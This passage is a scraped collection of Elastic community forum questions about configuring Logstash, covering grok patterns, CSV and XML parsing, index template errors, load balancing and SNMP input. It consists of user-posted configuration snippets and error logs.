# This will overwrite 'var.elasticsearch.hosts' and 'var.kibana.host' # cloud.id: <identifier> # # Format of cloud.auth is: <user>:<pass> # This is optional # If supplied this will overwrite 'var.elasticsearch.username' and 'var.elasticsearch.password' # If supplied this will overwrite 'var.kibana.username' and 'var.kibana.password' # cloud.auth: elastic:<password> # # ------------ Queuing Settings -------------- # # Internal queuing model, \"memory\" for legacy in-memory based queuing and # \"persisted\" for disk-based acked queueing. Defaults is memory # # queue.type: memory # # If using queue.type: persisted, the directory path where the data files will be stored. # Default is path.data/queue # # path.queue: # # If using queue.type: persisted, the page data files size. The queue data consists of # append-only data files separated into pages. Default is 64mb # # queue.page_capacity: 64mb # # If using queue.type: persisted, the maximum number of unread events in the queue. # Default is 0 (unlimited) # # queue.max_events: 0 # # If using queue.type: persisted, the total capacity of the queue in number of bytes. # If you would like more unacked events to be buffered in Logstash, you can increase the # capacity using this setting. Please make sure your disk drive has capacity greater than # the size specified here. If both max_bytes and max_events are specified, Logstash will pick # whichever criteria is reached first # Default is 1024mb or 1gb # # queue.max_bytes: 1024mb # # If using queue.type: persisted, the maximum number of acked events before forcing a checkpoint # Default is 1024, 0 for unlimited # # queue.checkpoint.acks: 1024 # # If using queue.type: persisted, the maximum number of written events before forcing a checkpoint # Default is 1024, 0 for unlimited # # queue.checkpoint.writes: 1024 # # If using queue.type: persisted, the interval in milliseconds when a checkpoint is forced on the head page # Default is 1000, 0 for no periodic checkpoint. # # queue.checkpoint.interval: 1000 # # ------------ Dead-Letter Queue Settings -------------- # Flag to turn on dead-letter queue. # # dead_letter_queue.enable: false # If using dead_letter_queue.enable: true, the maximum size of each dead letter queue. Entries # will be dropped if they would increase the size of the dead letter queue beyond this setting. # Default is 1024mb # dead_letter_queue.max_bytes: 1024mb # If using dead_letter_queue.enable: true, the directory path where the data files will be stored. # Default is path.data/dead_letter_queue # # path.dead_letter_queue: # # ------------ Metrics Settings -------------- # # Bind address for the metrics REST endpoint # # http.host: \"127.0.0.1\" http.host: \"10.2.101.43\" # # Bind port for the metrics REST endpoint, this option also accept a range # (9600-9700) and logstash will pick up the first available ports. # # http.port: 9600-9700 # # ------------ Debugging Settings -------------- # # Options for log.level: # * fatal # * error # * warn # * info (default) # * debug # * trace # # log.level: info log.level: debug path.logs: /var/log/logstash # # ------------ Other Settings -------------- # # Where to find custom plugins # path.plugins: [] # # Flag to output log lines of each pipeline in its separate log file. Each log filename contains the pipeline.name # Default is false # pipeline.separate_logs: false # # ------------ X-Pack Settings (not applicable for OSS build)-------------- #everything is commented here onwards same as original file Here is the config file with which works when used from command line, just removed extra grok. input { beats { port => 5044 } } filter { if \"Network Login\" in [message]{ grok{ match =>{\"message\" => \"%{TIMESTAMP_ISO8601:timeStamp}\\s*[/|]\\s*%{LOGLEVEL : level}\\s*\\|\\s*(?<deviceType>.*)\"} } } } output { elasticsearch { hosts => [\"http://27.0.0.1:9200\"] index => \"test3-%{+YYYY.MM.dd}\" #index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" #user => \"elastic\" #password => \"changeme\" } stdout { codec => rubydebug} } I am not sure where to look for errors. Thanks for your time.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "cf816944-5b37-4649-a9a0-e44b5c8d4546",
    "url": "https://discuss.elastic.co/t/how-to-do-a-conditional-regex-on-or/228172",
    "title": "How to do a conditional regex on or?",
    "category": [
      "Logstash"
    ],
    "author": "Amine_Maalfi",
    "date": "April 15, 2020, 4:52pm April 15, 2020, 5:56pm April 15, 2020, 6:25pm April 15, 2020, 9:52pm April 15, 2020, 9:57pm",
    "body": "i have three files named: - foo.log.2020-02-17.log - bar.log - foo.log.17-02-2020 i need to extract the whole file name and the date aswell i tried this expression but it's not working for me: (?< app_name >.*(?< logdate >({YEAR}-%{MONTHNUM}-%{MONTHDAY})|(%{MONTHDAY}-%{MONTHNUM}-%{YEAR}))?(.log)?)` when i remove the \"?\" after %{YEAR})) it works fine with files containing date i spent 2 hours trying to figure it out, if someone could help i'll be so much grateful.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b4b645ee-90e6-44f1-ac8b-4c57e41c27e2",
    "url": "https://discuss.elastic.co/t/config-field-as-date/228112",
    "title": "Config field as date",
    "category": [
      "Logstash"
    ],
    "author": "peretz_shlomi",
    "date": "April 15, 2020, 6:39pm April 15, 2020, 6:39pm April 15, 2020, 9:16pm",
    "body": "hi Hi I'm trying to import a file csv that in one of the fields has a field of time according to the above format 20200402 133001 Also attached is the definition in the file filter { csv { separator => \",\" columns => [\"time\",\"file type\",\"Product name\",\"Side\",\"Test result\",\"Machine NAME\",\"Barcode\",\"Barcode slave\",\"Component Qty\",\"NG Amount\",\"NG Qty\",\"Operator\",\"Working Order\",\"module number\",\"location\",\"Matiral NO\",\"NG name\",\"result\"] } mutate {convert => [\"Component Qty\" , \"integer\"] } mutate {convert => [\"NG Amount\" , \"integer\"] } mutate {convert => [\"NG Qty\" , \"integer\"] } date { match => [ \"time\", \"YYYYMMdd HHmmss\"]} } Still, I see it as a text field in the system. Thanks for the helpers",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1282eab1-a074-40e1-a428-6828418edd7f",
    "url": "https://discuss.elastic.co/t/filter-a-csv-with-a-csv/228091",
    "title": "Filter a CSV with a CSV",
    "category": [
      "Logstash"
    ],
    "author": "bazza",
    "date": "April 15, 2020, 10:54am April 15, 2020, 2:38pm April 15, 2020, 9:07pm April 15, 2020, 9:14pm",
    "body": "Hi, I have a log entry from mysql_audit.so that creates a CSV based log file. I have been able to filter this in to ELK no problems, but I have one type of log entry that contains comma delimited entries within the column. an example would be: <field1>, <field2>, \\'<field3, field3.1, field3.2, field3.3, field3.4>\\', <field4> The CSV filter doesn't recognize the escaped characters but does recognize the commas within the escaped field. This number of entries for is variable I have seen field3.1 - 3.6. I can create a separate sub filter for this entry type based on fields within the entry. But currently cannot find a way to join all of the 3.x fields together into a single column. I have tried using add_field, but any extra columns become a string in the log entry and I would like to keep in its own column. My filter defines the name for each column and when the filter hits this entry type I end up with system defined columns ie \"column4 column5 .... \" as I end up with an overflow of column names. I suspect that I may have to use the ruby filter to sort this out, only issue is my ruby.foo is not strong. Unfortunately this system is air gapped from the internet and I have to manually type any data across. Just wondering if the brains trust, may be able to help out in solving this problem.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a2bf4ee7-5386-47cc-809f-203f912db0a1",
    "url": "https://discuss.elastic.co/t/configuring-geoip-information-in-logstash-for-kibana-siem-network-map/228203",
    "title": "Configuring GeoIP information in Logstash for Kibana SIEM Network Map",
    "category": [
      "Logstash"
    ],
    "author": "rgeisman",
    "date": "April 15, 2020, 8:55pm",
    "body": "Hello All, I am working with a previous ELK stack that was setup to just use beats to go to Elasticsearch. I have upgraded he cluster and now using Logstash. Previously the SIEM Network Map worked because a \"geoip-info\" pipeline was created in the beats, and then the geoip-info ingestion was created in ES (identical to the example in the documentation\") But, now with Logstash, this doesn't work anymore. Of course, I have to remove pipeline: geoip-info from the beats setup, and we are ingesting data and that is working. I turned on Logstash geo-ip filter, but in discovery, lots of fields are missing including the geo related ones. How do I capture geo-ip info from the beats and make it go through Logstash to my indexes? (filebeat-, auditbeat-) and will show up in the SIEM network map?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4adc10fd-bde3-4397-80cb-7b0b562723a9",
    "url": "https://discuss.elastic.co/t/marking-url-as-dead-last-error-hostunreachableerror/228202",
    "title": "Marking url as dead. Last error: HostUnreachableError",
    "category": [
      "Logstash"
    ],
    "author": "Chris_Wilmott",
    "date": "April 15, 2020, 8:37pm",
    "body": "Hi, I have updated my ElasticSearch cluster from 6.6 to 7.6.2, as part of this upgrade the _all field and the _default_ fields were removed. I updated the cluster, checked the logs, and sure enough, one of my templates was complaining those fields existed. All my other templates were still correctly collecting and pushing data to ElasticSearch/Kibana. So, using the API console, I ran a PUT to /_template/logstash-qa01-stats to update the template from: { \"template\" : \"logstash-prod-stats-*\", \"settings\" : { \"index.refresh_interval\" : \"10s\" }, \"mappings\" : { \"_default_\" : { \"_all\" : { \"enabled\" : false, \"norms\" : false }, \"dynamic_templates\" : [ { \"string_fields\": { \"match\": \"*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"text\", \"index\": true } } }, { \"byte_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"short_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"integer_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"long_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"float_fields\": { \"match\": \"*\", \"match_mapping_type\": \"double\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }], \"properties\" : { \"@timestamp\": { \"type\" : \"date\", \"format\": \"date_optional_time\" }, \"@version\" : { \"type\" : \"keyword\", \"index\": true }, \"type_instance\" : { \"type\" : \"text\", \"index\" : true, \"norms\" : false, \"fields\" : { \"raw\" : { \"type\": \"text\", \"index\" : true } } } } } } } To: { \"index_pattern\": \"logstash-qa01-stats-*\", \"settings\": { \"index.refresh_interval\": \"10s\" }, \"mappings\": { \"dynamic_templates\": [{ \"string_fields\": { \"match\": \"*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"string\", \"index\": true, \"doc_values\": true } } }, { \"byte_fields\": { \"match\": \"*\", \"match_mapping_type\": \"long\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }, { \"short_fields\": { \"match\": \"*\", \"match_mapping_type\": \"long\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }, { \"integer_fields\": { \"match\": \"*\", \"match_mapping_type\": \"long\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }, { \"long_fields\": { \"match\": \"*\", \"match_mapping_type\": \"long\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }, { \"float_fields\": { \"match\": \"*\", \"match_mapping_type\": \"double\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }], \"properties\": { \"@timestamp\": { \"type\": \"date\", \"format\": \"date_optional_time\" }, \"@version\": { \"type\": \"keyword\", \"index\": true }, \"type_instance\": { \"type\": \"text\", \"index\": true, \"norms\": false, \"fields\": { \"raw\": { \"type\": \"string\", \"index\": true, \"doc_values\": true, \"ignore_above\": 256 } } } } } } The console accepted this and replied with 200 OK. I went back to my logs to make sure the data was being processed and now all I get is: [2020-04-15T20:28:52,111][ERROR][logstash.outputs.elasticsearch] Attempted to send a bulk request to elasticsearch' but Elasticsearch appears to be unreachable or down! {:error_message=>\"Elasticsearch Unreachable: [https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/][Manticore::SocketTimeout] Read timed out\", :class=>\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\", :will_retry_in_seconds=>64} [2020-04-15T20:28:52,663][WARN ][logstash.outputs.elasticsearch] Marking url as dead. Last error: [LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError] Elasticsearch Unreachable: [https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/][Manticore::SocketTimeout] Read timed out {:url=>https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/, :error_message=>\"Elasticsearch Unreachable: [https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/][Manticore::SocketTimeout] Read timed out\", :error_class=>\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\"} [2020-04-15T20:28:52,664][ERROR][logstash.outputs.elasticsearch] Attempted to send a bulk request to elasticsearch' but Elasticsearch appears to be unreachable or down! {:error_message=>\"Elasticsearch Unreachable: [https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/][Manticore::SocketTimeout] Read timed out\", :class=>\"LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError\", :will_retry_in_seconds=>64} [2020-04-15T20:28:56,245][INFO ][logstash.outputs.elasticsearch] Running health check to see if an Elasticsearch connection is working {:healthcheck_url=>https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/, :path=>\"/\"} [2020-04-15T20:28:56,346][WARN ][logstash.outputs.elasticsearch] Restored connection to ES instance {:url=>\"https://logstash-qa01:xxxxxx@ea33a63cd7ed235230b7aedcd62e4c37.eu-west-1.aws.found.io:9243/\"} Over and over again. No data is being logged to ElasticSearch/Kibana unless I restart logstash, then the missing data is pushed but then it stops sending new data. This cluster has been fine for years, and I don't understand how a template change could have broken it this badly. I am able to access my Elastic domain and get the following: { \"name\" : \"instance-0000000105\", \"cluster_name\" : \"ea33a63cd7ed235230b7aedcd62e4c37\", \"cluster_uuid\" : \"Tl84gLdZRI26oPe9FRWVuw\", \"version\" : { \"number\" : \"7.6.2\", \"build_flavor\" : \"default\", \"build_type\" : \"tar\", \"build_hash\" : \"ef48eb35cf30adf4db14086e8aabd07ef6fb113f\", \"build_date\" : \"2020-03-26T06:34:37.794943Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.4.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } My other environments, using the same ElasticSearch cluster are only impacted when I update the same template that is reporting issues in their environments. Does anyone have any suggestions as to what might have happened here?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "76c0ef5d-9f27-4bad-b6c8-e52c2cc736ef",
    "url": "https://discuss.elastic.co/t/ruby-code-to-push-whole-map-to-event-upon-aggregate-end-of-task/228174",
    "title": "Ruby code to push whole map to event upon aggregate end_of_task",
    "category": [
      "Logstash"
    ],
    "author": "kevin_branch",
    "date": "April 15, 2020, 5:04pm April 15, 2020, 5:57pm April 15, 2020, 8:17pm",
    "body": "I understand with aggregate that push_map_as_event_on_timeout can be used to push the whole aggregated map to the event when there is a timeout, but that there is nothing like a push_map_as_event_on_end_of_task. What would be the Ruby code I could use in my closing aggregate section (where end_of_task =>true) that would in one step push the entire map into the event? I have a variable set of map items I'll be aggregating, so enumerating them would be messy. I'm not strong with Ruby and the examples I've dug up so far are not quite getting me there. Thanks in advance for your advice, Kevin",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1b9ab7d5-003d-4aff-8424-5ea109d88533",
    "url": "https://discuss.elastic.co/t/translate-with-array-fields/228196",
    "title": "Translate with array fields",
    "category": [
      "Logstash"
    ],
    "author": "mtudisco",
    "date": "April 15, 2020, 7:22pm",
    "body": "Hi, Im using winlogbeat to send information to logstash and then all the information goes to a log in filesystem and some information goes to elasticsearch. To identify which information to store in ES, I identify certain events i dont want to store, those events are based on some values for [winlog][provider_name] [winlog][task] and [winlog][keywords]. I'd like to use translate, but as the field [winlog][keywords] is an array i dont know if theres something like an IN for instance: { \"winlog\": { \"keywords\": [ \"Audit Success\" ], \"provider_name\": \"Microsoft-Windows-Security-Auditing\", \"task\": \"Logon\", } I want to be able to tell that if provider_name is \"Microsoft-Windows-Security-Auditing\" and task is \"Logon\" and \"Audit Success\" is in Keywords, then i want to add a field to_es with \"false\" I can do it with if-then-else, but would like to use translate as its more easy to customize and maintain in the future. Any idea? thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "63573d36-ee4c-4950-af69-cdb4fc590e94",
    "url": "https://discuss.elastic.co/t/could-not-index-event-to-elasticsearch-root-mapping-definition-has-unsupported-parameters/228176",
    "title": "Could not index event to Elasticsearch. Root mapping definition has unsupported parameters",
    "category": [
      "Logstash"
    ],
    "author": "Chris_Wilmott",
    "date": "April 15, 2020, 5:20pm April 15, 2020, 5:53pm April 15, 2020, 6:06pm April 15, 2020, 6:19pm April 15, 2020, 6:36pm",
    "body": "Hi, I have recently upgraded from 6.6 to 7.6.2 and it all went smoothly enough. However I checked my logs this morning and have found the following: [2020-04-15T15:50:50,851][WARN ][logstash.outputs.elasticsearch] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"logstash-qa01-stats-2020.04.15\", :_type=>\"collectd\", :_routing=>nil}, 2020-04-15T14:03:42.347Z qa01grn01.redmatter.com %{message}], :response=>{\"index\"=>{\"_index\"=>\"logstash-qa01-stats-2020.04.15\", \"_type\"=>\"collectd\", \"_id\"=>nil, \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"Failed to parse mapping [_default_]: Root mapping definition has unsupported parameters: [_all : {norms=false, enabled=false}]\", \"caused_by\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"Root mapping definition has unsupported parameters: [_all : {norms=false, enabled=false}]\"}}}}} Here is my full template: { \"template\" : \"logstash-qa01-stats-*\", \"settings\" : { \"index.refresh_interval\" : \"10s\" }, \"mappings\" : { \"_default_\" : { \"_all\" : { \"enabled\" : false, \"norms\" : false }, \"dynamic_templates\" : [ { \"string_fields\": { \"match\": \"*\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"string\", \"index\": true, \"doc_values\": true } } }, { \"byte_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"short_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"integer_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"long_fields\" : { \"match\" : \"*\", \"match_mapping_type\" : \"long\", \"mapping\" : { \"type\" : \"double\", \"doc_values\": true } } }, { \"float_fields\": { \"match\": \"*\", \"match_mapping_type\": \"double\", \"mapping\": { \"type\": \"double\", \"doc_values\": true } } }], \"properties\" : { \"@timestamp\": { \"type\" : \"date\", \"format\": \"date_optional_time\" }, \"@version\" : { \"type\" : \"keyword\", \"index\": true }, \"type_instance\" : { \"type\" : \"text\", \"index\" : true, \"norms\" : false, \"fields\" : { \"raw\" : { \"type\": \"text\", \"index\" : true } } } } } } } I can't quite work out which bit is causing an issue. Does anyone have any suggestions?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b5121e0f-b647-4f14-9554-79607a9b84d7",
    "url": "https://discuss.elastic.co/t/nginx-loadbalancing-to-logstash/228177",
    "title": "Nginx LoadBalancing to Logstash",
    "category": [
      "Logstash"
    ],
    "author": "luiz.miguelsl",
    "date": "April 15, 2020, 5:21pm April 15, 2020, 5:54pm",
    "body": "Hi there guys, I hope you're all safe. I have two Logstash instances behind an Nginx as the load balancer. The problem is that load balancing isn't happening properly. Always, one server is receiving more traffic than the other. I tried least_conn e round-robin on Nginx and both present the same results. Here's my Nginx config: stream { upstream logstash { server server1:5044; server server2:5044; } server { listen endpoint_logstash:80; proxy_pass logstash; } } As mentioned, I tried the default load-balancing method round-robin as well as least_conn. Do you guys have any idea about what could I be missing? I think it could be related to the way Logstash persists TCP connections, but it's only a hunch. Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "918ef7e4-6548-425d-ac12-f6c2e2268881",
    "url": "https://discuss.elastic.co/t/accessing-metafield-index-in-logstash/228113",
    "title": "Accessing Metafield _index in Logstash",
    "category": [
      "Logstash"
    ],
    "author": "InfiniteLoops",
    "date": "April 15, 2020, 12:41pm April 15, 2020, 5:12pm April 15, 2020, 4:05pm April 15, 2020, 5:13pm",
    "body": "I am using this output for Elasticsearch index => \"%{[headers][key]}-data-%{+YYYY.MM}\" So it creates a index name with the date added. I am trying to reindex this data through a logstash filter. So I am using the previous index as an input to logstash and trying to output the data to the same name while appending a reindexed value. index => \"%{[_index]}-reindexed\" It says this is a Meta field. Do I need to do something different to access it? I have also tried index => \"%{[@metadata][_index]}-reindexed\"",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "289d53d7-9a5a-40f6-bd35-404e65418e23",
    "url": "https://discuss.elastic.co/t/logstash-filter-not-working-with-sysmon/228023",
    "title": "Logstash filter not working with Sysmon",
    "category": [
      "Logstash"
    ],
    "author": "martinsrm",
    "date": "April 15, 2020, 3:44am April 15, 2020, 4:37pm April 15, 2020, 4:36pm",
    "body": "Hello everybody, I am trying to create a field called \"Threat\" just if I have a log from the \"Microsoft-Windows-Sysmon\" provider, but the \"if\" condition never works, could you guys give me an idea about it? Tks ########################### logstash .conf file ######################## input { beats { port => 5044 } } filter { if \"Microsoft-Windows-Sysmon\" in [provider_name] { #if [provider_name] == \"Microsoft-Windows-Sysmon\" { mutate { add_field => {\"Threat\" => \"Test\"} } } } output { stdout { codec => rubydebug } } ############################ Logstash output ############################# \"@version\" => \"1\", \"winlog\" => { \"channel\" => \"Microsoft-Windows-Sysmon/Operational\", \"record_id\" => 9921, \"task\" => \"File created (rule: FileCreate)\", \"process\" => { \"thread\" => { \"id\" => 3064 }, \"pid\" => 2392 }, \"api\" => \"wineventlog\", \"opcode\" => \"Info\", \"computer_name\" => \"MyVm\", \"provider_guid\" => \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\", \"user\" => { \"identifier\" => \"S-1-5-18\", \"name\" => \"SYSTEM\", \"type\" => \"User\", \"domain\" => \"NT AUTHORITY\" }, \"event_id\" => 11, \"provider_name\" => \"Microsoft-Windows-Sysmon\", \"event_data\" => { \"RuleName\" => \"technique_id=T1044,technique_name=File System Permissions Weakness\", \"CreationUtcTime\" => \"2020-04-15 03:14:58.941\" }, \"version\" => 2 }, \"@timestamp\" => 2020-04-15T03:14:58.941Z, \"event\" => { \"created\" => \"2020-04-15T03:15:00.766Z\", \"code\" => 11, \"provider\" => \"Microsoft-Windows-Sysmon\", \"action\" => \"File created (rule: FileCreate)\", \"module\" => \"sysmon\",",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6a1bccce-9c9e-4f71-ad45-a4e3f0880b31",
    "url": "https://discuss.elastic.co/t/snmp-input-plugin-snmp-v3-not-working/228164",
    "title": "SNMP input plugin - SNMP V3 not working",
    "category": [
      "Logstash"
    ],
    "author": "Thelmo_Henrique_Sant",
    "date": "April 15, 2020, 4:01pm",
    "body": "Hi , I am new with ELK and I'm trying to configure my logstash to get SNMP V3 information from my devices, but unfortunately, I don't know what I am doing wrong. I followed the procedures from the SNMP input plugin page: https://www.elastic.co/guide/en/logstash/current/plugins-inputs-snmp.html First, I generated a .DIC file: root@my-PC# smidump --level=1 -k -f python Device-MIB.mib > Device-MIB.dic Device-MIB.mib:6: failed to locate MIB module `SNMPv2-SMI' Device-MIB.mib:8: failed to locate MIB module `SNMPv2-TC' Device-MIB.mib:17: unknown object identifier label `enterprises' smidump: module `Device-MIB.mib' contains errors, expect flawed output I saved the .DIC file at the this path: /etc/logstash/MIB/Device-MIB.dic This is my logstash-inputsnmpv3.conf configuration file: input { snmp { hosts => [{host => \"udp:10.10.10.212/161\" version => \"3\"}] get => [\"1.3.6.1.4.1.41263.1\"] mib_paths => [\"/etc/logstash/MIB/\"] security_name => \"snmp_user\" auth_protocol => \"sha\" auth_pass => \"secret\" priv_protocol => \"aes\" priv_pass => \"secret\" security_level => \"authPriv\" type => \"snmp\" } } And this is the output that I have: [root@ELK-SERVER bin]# ./logstash -f /etc/logstash/conf.d/ -l /var/log/logstash/ WARNING: Could not find logstash.yml which is typically located in $LS_HOME/config or /etc/logstash. You can specify the path using --path.settings. Continuing using the defaults Could not find log4j2 configuration at path /usr/share/logstash/config/log4j2.properties. Using default config which logs errors to the console [WARN ] 2020-04-16 01:37:21.184 [LogStash::Runner] multilocal - Ignoring the 'pipelines.yml' file because modules or command line options are specified [INFO ] 2020-04-16 01:37:21.195 [LogStash::Runner] runner - Starting Logstash {\"logstash.version\"=>\"7.6.0\"} [INFO ] 2020-04-16 01:37:22.977 [Converge PipelineAction::Create<main>] Reflections - Reflections took 34 ms to scan 1 urls, producing 20 keys and 40 values [WARN ] 2020-04-16 01:37:23.456 [[main]-pipeline-manager] LazyDelegatingGauge - A gauge metric of an unknown type (org.jruby.RubyArray) has been create for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [INFO ] 2020-04-16 01:37:23.463 [[main]-pipeline-manager] javapipeline - Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>8, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>1000, \"pipeline.sources\"=>[\"/etc/logstash/conf.d/logstash-inputsnmpv3.conf\"], :thread=>\"#<Thread:0xf63e716 run>\"} [INFO ] 2020-04-16 01:37:23.532 [[main]-pipeline-manager] snmp - using plugin provided MIB path /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-snmp-1.2.1/lib/mibs/logstash [INFO ] 2020-04-16 01:37:23.553 [[main]-pipeline-manager] snmp - using plugin provided MIB path /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-snmp-1.2.1/lib/mibs/ietf [INFO ] 2020-04-16 01:37:25.407 [[main]-pipeline-manager] snmp - using user provided MIB path /etc/logstash/MIB/ [INFO ] 2020-04-16 01:37:25.582 [[main]-pipeline-manager] javapipeline - Pipeline started {\"pipeline.id\"=>\"main\"} [INFO ] 2020-04-16 01:37:25.638 [Agent thread] agent - Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [INFO ] 2020-04-16 01:37:25.831 [Api Webserver] agent - Successfully started Logstash API endpoint {:port=>9600} [ERROR] 2020-04-16 01:37:28.655 [[main]<snmp] snmp - error invoking get operation on 10.10.10.212 for OIDs: [\"1.3.6.1.4.1.41263.1\"], ignoring {:exception=>#<LogStash::SnmpClientError: timeout sending snmp get request to target 10.10.10.212/161>, :backtrace=>[\"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-snmp-1.2.1/lib/logstash/inputs/snmp/base_client.rb:60:in `get'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-snmp-1.2.1/lib/logstash/inputs/snmp.rb:171:in `block in run'\", \"org/jruby/RubyArray.java:1814:in `each'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-snmp-1.2.1/lib/logstash/inputs/snmp.rb:167:in `run'\", \"/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:328:in `inputworker'\", \"/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:320:in `block in start_input'\"]} I don't understand what I am doing wrong. With SNMP V2 ,logstash works properly (using snmp trap plugin). I tried to search some tutorial explaining how to configure it, but I didn't found it. Please, can someone help me with this issue? Thanks in advanced. Thelmo Henrique",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7a8bfccc-f5b4-4604-a4e5-c5f2f94fa39c",
    "url": "https://discuss.elastic.co/t/transforming-objects-with-key-and-value-fields-into-simple-fields/228152",
    "title": "Transforming objects with key and value fields into simple fields",
    "category": [
      "Logstash"
    ],
    "author": "wfhartford",
    "date": "April 15, 2020, 3:18pm April 15, 2020, 3:59pm April 15, 2020, 4:00pm",
    "body": "Logstash is receiving events which include a list of json objects, each with two fields key and value: { \"details\": [ { \"key\": \"foo\", \"value\": \"foo value\" }, { \"key\": \"bar\", \"value\": \"bar value\" }, { \"key\": \"baz\", \"value\": \"baz value\" } ] } I would like to transform this field into a cleaner and more searchable format such as: { \"details_parsed\": { \"foo\": \"foo value\", \"bar\": \"bar value\", \"baz\": \"baz value\" } } I have not been able to find a logstash filter plugin which will help me very much with this transformation. I'm sure I could use a ruby filter, but would rather use a cleaner solution if one exists. Thanks for any help",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "54e2c7ac-0d67-43c4-b189-b238f187a991",
    "url": "https://discuss.elastic.co/t/how-to-parse-few-xml-files-with-different-number-of-tags-in-different-files-using-logstash/228156",
    "title": "How to parse few XML files with different number of tags in different files using Logstash?",
    "category": [
      "Logstash"
    ],
    "author": "Gerych",
    "date": "April 15, 2020, 3:34pm April 15, 2020, 3:43pm",
    "body": "Can someone tell me how you can parse these types of files through the logstash and after that index it in elasticsearch. Files can contain a variable number of internal tags. Untitled1065×600 76.8 KB Here is my config file, but unfortunately it does not work correctly. input { file { path => \"/folder/etlexpmx.xml\" start_position => \"beginning\" sincedb_path => \"/dev/null\" exclude => \"*.gz\" type => \"xml\" codec => multiline { pattern => \"^<\\? PMSetup .*\\>\" negate => \"true\" what => \"previous\" } } } filter { xml { source => \"message\" target => \"PMSetup\" force_array => \"false\"} } output { elasticsearch { codec => json hosts => \"localhost\" index => \"TESTetlexpmx\" } stdout { codec => rubydebug } } I want to get the structure as: startTime = \"2019-05-30T15: 00: 00.000 + 02: 00: 00\" BMF = 400495 BTF = 610 measurementType = \"PABTS\" c123000 = 125483 But as a result, the index is not created in elastisearch",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "92b52e6d-c870-4299-abed-c422fc78a2ea",
    "url": "https://discuss.elastic.co/t/parsing-data-using-logstash/228155",
    "title": "Parsing data using logstash",
    "category": [
      "Logstash"
    ],
    "author": "Ananya_Mohiley",
    "date": "April 15, 2020, 3:26pm",
